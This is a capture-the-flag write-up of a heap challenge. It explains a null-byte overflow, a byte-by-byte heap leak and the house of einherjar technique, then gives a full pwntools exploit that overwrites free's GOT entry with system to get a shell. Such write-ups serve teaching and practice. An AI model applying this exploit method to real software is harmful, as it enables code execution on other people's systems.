This was a cool heap challenge from the CTF.
it consisted of a menu, thate lets the user do 5 things:
  1. Set sender - this will call malloc(0x78), store the address in the `sender` global variable, and ask for user input.
  2. Add message - this function will allocate a new message on the heap. It will first allocate the message structs, and then the `receiver` and the `msg`. then it will ask the user for inputs.
  3. Edit message - this function will take a username from the user, and let the user change the msg of that receiver.
  4. Print all - prints all the messages
  5. Send all - this will basiclly free all the messages from the heap.

Now, I was looking for vulnerabilites. 
I noticed, that in the `add_message` function, they used the `input` function to write our input to the new allocated chunk.
They also gave the function a size parameter, so that it knew how many bytes to read. I noticed that the size is exactly the same size of the chunk.
The input function will just use `scanf("%{len}%s%*c")`so that means that if we write `len` bytes, a null byte will be written in `receiver[len]`, which is a null byte overflow!

How it looks in GDB:

Before:

![image](https://github.com/itaybel/Weekly-CTF/assets/56035342/5dd4a683-f89a-4c0c-91d8-f79b3a3d7993)


After: 

![image](https://github.com/itaybel/Weekly-CTF/assets/56035342/467df85a-dcb6-43ab-8ded-dfdf01337555)


*Exploitation*

I knew we needed to use the `house of einherjar`.
 It overwrites into the 'size' of the next chunk in memory and clears the `PREV_IN_USE` flag to 0. (as we saw in GDB, from 0x201, we made the next chunk size 0x200)
 Also, it overwrites into prev_size (already in the previous chunk's data region) a fake size. (this could be seen in 1 quadboard before the 0x200 sizefield)
 When the next chunk is freed, it finds the previous chunk to be free and tries to consolidate by going back 'fake size' in memory. 
 But in reality, the previous chunk isn't even freed. this can give us an overlapping chunks primitive which is very very strong.

 Now, I was searching for leaks. the house of einherjar requires a leak, becuase of this check in `malloc.c`:
 ```
  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");
```

we need to satisfy the equations: `fake chunk->fd->bk = fake_chunk` and `fake chunk->bk->fd = fake_chunk`, which requires a heap leak.

When searching for leaks, I noticed that in the `add_message` function,the allocated memory isn't initialized. this means, that if we have a message `A`, free it, and then allocate it again, heap meta data will be in our new chunk's user data.
The problem is that when it asks for input, it will nullterminate our string. so after we try to read it, it will just stop at the null byte and won't check stuff after it and leak us stuff.
There is a really cool bypass to that, in the `edit_message` function:

![image](https://github.com/itaybel/Weekly-CTF/assets/56035342/63837f6f-fcdd-409b-9653-aea7bae13f0e)

This function will ask the user for a `name`, and look through all the messages for a message with that name. If it finds a name, it will let us edit it, otherwise, we will know it couldn't find a name.

Lets see this behaviour in gdb. I added this function calls to my python script:
```py
    for i in range(7):
        add_msg()

    add_msg()
    send_all()
    
    chunk_a = add_msg("a", "b")
```

The first part will basiclly allocate 7 chunks, which then will fill up the tcache (their fd is mangled, and I prefer to leak fastbin's metadata)
then we add another msg, and then free them all. then we allocate `chunk_a`, which its username will be takes from the 0x80 fastbin. 
This is how it looks like in gdb:

![image](https://github.com/itaybel/Weekly-CTF/assets/56035342/18531f9b-acd4-47cc-8529-88ddbae57370)

It will write the name we gave it + a nullbyte. The other metadata is still there.
Now, we can use the `edit_message` function, to bruteforce byte-byte the 2 next bytes! we can start by supplying a `name = \x61\x00\x01`, and if the next byte is 0x01, it will let us edit, if it doesn't , we'll try `name = \x61\x00\x02`, until we can edit. 
We do it twice, and this will leak us the third and fourth bytes of the heap. The heap will always contain 3/4 bytes (PIE is not enabled in our case), and we know that the base address will always start with 000. This means we would need to bruteforce 1 nibble, but thats fine, because it has success rates of 1/16.
here is my brute force:

```py
    for i in range(7):
        add_msg()

    add_msg()
    send_all()

    chunk_a = add_msg("a", "a")
    third_byte = ""
    for i in range(256):
        if edit_msg("a\x00"+ chr(i), "a") == True and i != 10:
            third_byte = i
            break

    print("third byte is", third_byte)
    fourth_byte = ""
    for i in range(256):
        if edit_msg("a\x00" + chr(third_byte) + chr(i), "a") == True and i != 10:
            fourth_byte = i
            break
    print("third byte is", fourth_byte)

    heap_base = (fourth_byte << 24) + (third_byte << 16) + (0x50 << 8) #we guassed that the unknows nibble is 0x5
            
    print("heap base", hex(heap_base))
```

Now, we are ready to exploit the house of einherjar!
So lets say we have an overlapping chunks. what would we want to overwrite?
There is the msg struct! it contains pointers to both the name, and the msg strings, and if we could tamper with the msg string and then use the edit function, we can get an arbitrary write primitive.


```py


#!/usr/bin/env python3

from pwn import *

exe = ELF("./textsender")
libc = ELF("./libc-2.32.so")
ld = ELF("./ld-2.32.so")

context.binary = exe

p = gdb.debug([exe.path])


def set_sender(name):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil(": ")
    p.sendline(name)

def add_msg(receiver="empty", msg="empty"):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("Receiver: ")
    p.sendline(receiver)
    p.recvuntil("Message: ")
    p.sendline(msg)
    return receiver
def edit_msg(name, msg):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("Name: ")
    p.sendline(name)
    if p.recvn(1) == b"[":
        return False
    p.recvuntil("message: ")
    old = p.recvline()
    p.recvuntil("message: ")
    p.sendline(msg)  
    return True


def print_all():
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("Total: ")
    total = int(p.recvuntil(" ")[:-1])
    prints = []
    for i in range(total):
        p.recvuntil(") ")
        sender = p.recvuntil(":")[:-1]
        msg = p.recvline()[:-1]
        prints.append([sender, msg])
    return prints
def send_all():
    p.recvuntil("> ")
    p.sendline("5")

def main():
    for i in range(7):
        add_msg()

    add_msg()
    send_all()

    chunk_a = add_msg("a", "a")
    third_byte = ""
    for i in range(256):
        if edit_msg("a\x00"+ chr(i), "a") == True and i != 10:
            third_byte = i
            break

    print("third byte is", third_byte)
    fourth_byte = ""
    for i in range(256):
        if edit_msg("a\x00" + chr(third_byte) + chr(i), "a") == True and i != 10:
            fourth_byte = i
            break
    print("third byte is", fourth_byte)

    heap_base = (fourth_byte << 24) + (third_byte << 16) + (0x50 << 8)
            
    print("heap base", hex(heap_base))

    send_all()
    prev_size = 0xf0

    add_msg("a",  b"A" * (240 + 184) + p64(prev_size)  + p64(heap_base + 0x1510) + p64(heap_base + 0x1510) + p64(heap_base + 0x1500) * 2)
    for i in range(6):
        add_msg("t", "t")

    
    chunk_a = add_msg(b"B" * 0x70 + p64(prev_size), "/bin/sh\x00")

    set_sender("AVOID CONSOLIDATION")
    input()
    send_all()
    for i in range(7):
        add_msg()

    binshaddress = heap_base + 0x1600
    free_got = 0x404018

    chunk = add_msg("J", b"X" * 72 + p64(0x21) + p64(binshaddress) + p64(free_got))

    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("Name: ")
    p.sendline("/bin/sh\x00")
    p.recvuntil("message: ")
    libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x8cef0
    p.recvuntil("message: ")
    p.sendline(p64(libc.sym.system)) 

    p.interactive()




if __name__ == "__main__":
    main()
```
